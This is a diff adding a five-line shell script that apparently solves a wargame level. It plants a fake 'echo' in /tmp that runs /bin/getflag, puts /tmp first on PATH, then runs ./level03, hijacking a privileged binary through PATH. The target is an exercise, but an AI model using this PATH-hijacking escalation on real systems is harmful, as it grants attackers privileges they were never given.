@@ -1,0 +1,5 @@
+echo "/bin/getflag" > /tmp/echo
+PATH=/tmp:$PATH
+chmod +x /tmp/echo
+
+./level03
